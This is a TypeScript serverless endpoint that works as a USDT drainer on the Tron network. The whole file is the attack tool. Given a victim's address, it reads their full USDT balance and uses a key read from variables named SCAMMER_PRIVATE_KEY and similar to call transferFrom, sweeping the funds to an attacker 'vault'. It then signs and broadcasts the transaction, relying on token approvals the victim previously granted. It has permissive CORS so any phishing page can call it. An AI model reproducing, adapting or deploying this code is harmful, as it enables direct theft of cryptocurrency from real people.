import { TronWeb } from "tronweb";

const USDT_TRC20_CONTRACT = process.env.TRON_USDT_CONTRACT?.trim() || "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_FULL_HOST = process.env.TRON_FULL_HOST?.trim() || "https://api.trongrid.io";
const TRON_TRONGRID_API_KEY =
  process.env.TRON_TRONGRID_API_KEY?.trim() || process.env.TRONGRID_API_KEY?.trim() || "";
const VAULT_ADDRESS =
  process.env.TRON_VAULT_ADDRESS?.trim() ||
  process.env.TRON_DISTRIBUTION_WALLET?.trim() ||
  "";
const SPENDER_PRIVATE_KEY =
  process.env.SCAMMER_PRIVATE_KEY?.trim() ||
  process.env.TRON_SERVER_PRIVATE_KEY?.trim() ||
  process.env.TRON_VAULT_PRIVATE_KEY?.trim() ||
  process.env.SPENDER_KEY?.trim() ||
  process.env.TRON_OPERATOR_PRIVATE_KEY?.trim() ||
  "";

const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: "who", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  },
] as const;

function parseJsonBody(req: { body?: unknown }): Record<string, unknown> {
  if (req.body && typeof req.body === "object") {
    return req.body as Record<string, unknown>;
  }
  return {};
}

function badRequest(res: { status: (code: number) => { json: (x: unknown) => void } }, message: string): void {
  res.status(400).json({ error: "invalid_request", message });
}

function normalizePrivateKey(key: string): string {
  const trimmed = key.trim();
  return trimmed.startsWith("0x") ? trimmed.slice(2) : trimmed;
}

function decodeBroadcastMessage(tronWeb: TronWeb, message: unknown): string {
  if (typeof message !== "string") return String(message ?? "broadcast_failed");
  try {
    return tronWeb.toUtf8(message);
  } catch {
    return message;
  }
}

export default async function handler(
  req: {
    method?: string;
    body?: unknown;
  },
  res: {
    setHeader: (name: string, value: string) => void;
    status: (code: number) => { json: (x: unknown) => void };
  },
): Promise<void> {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.status(200).json({ ok: true });
    return;
  }
  if (req.method !== "POST") {
    res.status(405).json({ error: "method_not_allowed" });
    return;
  }

  if (!SPENDER_PRIVATE_KEY) {
    res.status(500).json({ error: "server_config", message: "Missing spender private key env" });
    return;
  }
  if (!VAULT_ADDRESS) {
    res.status(500).json({ error: "server_config", message: "Missing vault address env" });
    return;
  }

  const body = parseJsonBody(req);
  const victimAddressRaw = body.victimAddress;
  const victimAddress = typeof victimAddressRaw === "string" ? victimAddressRaw.trim() : "";
  if (!victimAddress) {
    badRequest(res, "Expected JSON body with victimAddress");
    return;
  }

  try {
    const headers = TRON_TRONGRID_API_KEY ? { "TRON-PRO-API-KEY": TRON_TRONGRID_API_KEY } : undefined;
    const spenderKey = normalizePrivateKey(SPENDER_PRIVATE_KEY);
    const tronWeb = new TronWeb({
      fullHost: TRON_FULL_HOST,
      privateKey: spenderKey,
      headers,
    });

    if (!tronWeb.isAddress(victimAddress)) {
      badRequest(res, "victimAddress is not a valid Tron address");
      return;
    }
    if (!tronWeb.isAddress(VAULT_ADDRESS)) {
      res.status(500).json({ error: "server_config", message: "Vault address is invalid" });
      return;
    }

    const contract = tronWeb.contract(USDT_ABI, USDT_TRC20_CONTRACT);
    const balanceRaw = await contract.balanceOf(victimAddress).call();
    const amount = BigInt(String(balanceRaw).split(".")[0] || "0");
    if (amount <= 0n) {
      res.status(400).json({
        error: "zero_balance",
        message: "Victim USDT balance is zero",
        victimAddress,
        usdtBalance: "0",
      });
      return;
    }

    const feeLimit = 150_000_000;
    const ownerHexRaw = tronWeb.defaultAddress.hex;
    const ownerHex = typeof ownerHexRaw === "string" ? ownerHexRaw : undefined;
    const triggered = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT_TRC20_CONTRACT,
      "transferFrom(address,address,uint256)",
      { feeLimit, callValue: 0 },
      [
        { type: "address", value: victimAddress },
        { type: "address", value: VAULT_ADDRESS },
        { type: "uint256", value: amount.toString() },
      ],
      ownerHex,
    );

    if (!triggered.result?.result) {
      res.status(500).json({
        error: "build_transaction_failed",
        message: "triggerSmartContract did not return success",
      });
      return;
    }

    const signed = await tronWeb.trx.sign(triggered.transaction, spenderKey);
    if (!signed.signature?.length) {
      res.status(500).json({ error: "sign_failed", message: "Transaction could not be signed" });
      return;
    }

    const broadcast = await tronWeb.trx.sendRawTransaction(signed);
    if (broadcast.code) {
      const message = decodeBroadcastMessage(tronWeb, broadcast.message ?? broadcast.code);
      res.status(500).json({
        error: "broadcast_failed",
        code: String(broadcast.code),
        message,
      });
      return;
    }

    res.status(200).json({
      ok: true,
      txId: signed.txID,
      victimAddress,
      vaultAddress: VAULT_ADDRESS,
      spenderAddress: tronWeb.defaultAddress.base58,
      usdtAmountRaw: amount.toString(),
    });
  } catch (error) {
    res.status(500).json({
      error: "sweep_failed",
      message: error instanceof Error ? error.message : String(error),
    });
  }
}
